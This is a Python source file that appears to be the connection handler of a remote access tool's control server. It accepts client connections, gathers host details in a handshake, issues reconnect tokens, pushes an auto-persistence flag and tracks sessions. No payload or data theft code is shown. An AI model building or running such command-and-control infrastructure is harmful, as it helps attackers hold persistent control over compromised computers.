import socket
import threading
import time
import socket
import os
import binascii
from .other import printColor


class Handler(threading.Thread):
    #Manage incoming connections with a thread system
    dict_conn={}# dict = tuple | dict = socket,address  Stores all socket, ip, port and connection health status.
    number_conn=0  #count number of connexions
    status_connection_display = True 
    start_handler = False

#    ptable = PrettyTable() #Ascii tables dynamic.
#    ptable.field_names =["Session","IP","Port","Is he alive"] #append title of row.

    def __init__(self,host,port,display,auto_persistence):

        threading.Thread.__init__(self)
        self.port = port 
        self.host = host
        self.sock_server=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.display = display
        self.auto_persistence = auto_persistence
    
    def SuccessfullyQuit(self):
        try:
            print("\n")
            for key,value in Handler.dict_conn.items():
                value[0].close()
                printColor("error","[-] {}:{} Connection closed.".format(value[1],value[2]))
                
        except Exception  as e: 
            printColor("error","[-] Error closing a socket. Error: {}".format(e))
            pass
        
        self.sock_server.close()
        printColor("error","\r[-] Connexion server closed.")
    
    def run(self):
        Handler.status_connection_display = self.display
        
        while True:
            #Test if the port listening is good.
            try:
                self.sock_server.bind((self.host,self.port))
                break
            except OSError as e:
                printColor("error","[-] Port {} is already busy or you don't have permission to listen on this port !".format(self.port))
                #printColor("error","[-] "+str(e)+".")
                printColor("information","[?] The server will try again to listen on port {}. If the server is still unable to listen on the port {} make sure to check which service is blocked with: netstat -petulan |grep {} command.".format(self.port,self.port,self.port))
                time.sleep(3)
                print("\n")
                
        Handler.start_handler = True #You can start the management 
        self.sock_server.listen(10)
        while True:               
    
            conn,address = self.sock_server.accept()
            if(Handler.status_connection_display):
                printColor("information","\r[+] New client {}:{}".format(address[0],address[1]))
            else:
                pass
            
            handshake = HandShake(conn,address,self.auto_persistence)
            handshake.daemon = True
            handshake.start()



class HandShake(threading.Thread):
  
    '''
This class is used to manage connections once the accepted function has been called.
Manual control allows to add crucial information like username, RAT and stores etc. to the main dictionary.
The client first sends this information, then the server sends the parameters as auto persistence. 

    '''
    def __init__(self,conn,address,auto_persistence):
        threading.Thread.__init__(self)
        self.conn = conn
        self.address = address
        self.auto_persistence = auto_persistence


    def generateToken(self):
        return binascii.hexlify(os.urandom(24)).decode("utf8")


    def sendUltraSafe(self, data):
        
        try:
            self.conn.send(data.encode())
            print("[+] send: ",data)
        except Exception as e:
            print(e)
        else:
            try:
                print("EN ATTENTE dans la reponse de ultrasafe")
                self.conn.settimeout(3)
                confirmation = self.conn.recv(4096).decode("utf8")
            except Exception as e:
                print("ERROR 2020",e)
            else:
                if(confirmation == "confirmation"):
                    print("IN SENDULTRASAFE CONFIRMATION OK")
                else:
                    print("IN SENDULTRASAFE CONFIRMATION NOT OK")
        
        self.conn.settimeout(None)


    def recvUltraSafe(self):
        data = ""
        self.conn.settimeout(3)
        try:
            data = self.conn.recv(4096).decode("utf8")
        except socket.timeout:
            print("timeout in recvultrasafe")
        except Exception:
            print("error 2021")
        else:   
            try:
                print("SEND confirmation in recvultrasafe.")
                self.conn.send(b"confirmation")
            except Exception:
                print("EXCEPTION in recvULTRASAFE CONFIRMATION")
 
        self.conn.settimeout(None)
        return data
    

    def recvFirstInfo(self):
        #Collect informations with Handshake client.
        #if the client sends MOD_RECONNECT it means that the client tries to reconnect, to be sure the client sends a tokken.
        list_info = []
        while True:
            data = self.recvUltraSafe()
            print(data)
            if(data == "\r\n"):
                print("Stop recvFirstInfo")
                break
            
            if(data=="MOD_RECONNECT"):
                print("IN MOD RECONNECT (recv Frist Info)")
                token = self.recvUltraSafe()
                if bool(Handler.dict_conn):
                    print(token)
                    for value in Handler.dict_conn.values():
                        print(value[7])
                        if(value[7] == token): 
                            print("Token doublon")
                            break
                        else:
                            end = self.recvUltraSafe()
                            if(end == "\r\n"):
                                print("End reconnexion.")
                                break

                else:
                    print("dict empty")
            else:       
                
                tmp = data.split("|")
                list_info.append(tmp[1])
        
        return list_info


    def sendParameterOfClient(self,token):
        if(self.auto_persistence):
            self.sendUltraSafe("MOD_HANDSHAKE_AUTO_PERSISTENCE | True")
            #print(" SEND MOD_HANDSHAKE_AUTO_PERSISTENCE | True")

        else:
            self.sendUltraSafe("MOD_HANDSHAKE_AUTO_PERSISTENCE | False")
            #print("SEND MOD_HANDSHAKE_AUTO_PERSISTENCE | False")

        self.sendUltraSafe("MOD_HANDSHAKE_TOKEN | " + token)        
        print("SEND TOKEN")
        #time.sleep(0.3)
        self.sendUltraSafe("\r\n") #end echange.
        print("FINISH")


    def run(self):
        
        
        list_info = self.recvFirstInfo() #Collect informations with Handshake client. #1
        if(bool(list_info)):
            #print("sencode part persi go !!!! ")
            token = self.generateToken()
            self.sendParameterOfClient(token) #2
        else:
            #if empty,  ignore. If the list is empty, it means that the client sent a mod_reconnect.
            pass 

        if(bool(list_info)):       
            Handler.dict_conn[Handler.number_conn] = [self.conn, self.address[0],self.address[1], True, list_info[0], list_info[1], list_info[2]] #3 #True = Connexion is life 
            Handler.number_conn+=1 #4
        else:
            #if empty, ignore.
            pass 
